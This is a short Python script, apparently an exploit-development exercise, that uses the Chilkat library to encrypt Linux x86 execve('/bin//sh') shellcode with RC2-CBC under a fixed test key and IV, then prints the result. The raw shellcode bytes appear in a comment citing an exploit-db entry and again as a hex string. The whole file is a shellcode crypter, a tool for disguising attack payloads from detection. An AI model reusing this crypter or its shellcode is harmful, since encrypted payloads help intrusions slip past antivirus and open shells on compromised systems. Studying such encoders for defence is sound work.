import sys
import chilkat

# Define RC2 parameters
crypt = chilkat.CkCrypt2()
success = crypt.UnlockComponent("Anything for 30-day trial")
if (success != True):
    print(crypt.lastErrorText())
    sys.exit()

crypt.put_CryptAlgorithm("rc2")                                                  # set the encryption algorithm to "rc2"
crypt.put_CipherMode("cbc")                                                      # set cipher mode to "cbc"
crypt.put_KeyLength(128)                                                         # set key length 128-bit
crypt.put_Rc2EffectiveKeyLength(128)                                             #
crypt.put_PaddingScheme(0)                                                       # take care of padding
crypt.put_EncodingMode("hex")                                                    # set encoding mode to HEX
ivHex = "0001020304050607"                                                       # setup initialization vector for CBC mode.
crypt.SetEncodedIV(ivHex,"hex")                                                  # set encoding to HEX
keyHex = "000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F"      # set secret key 128-bit
crypt.SetEncodedKey(keyHex,"hex")

# "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80", https://www.exploit-db.com/exploits/43735/
Encrypted_Shellcode = crypt.encryptStringENC("31c05089e2682f2f7368682f62696e89e350b00bcd80")  # encrypt shellcode in string NOT bytearray format
print "Encrypted Shellcode: " + Encrypted_Shellcode                                           # print encrypted shellcode
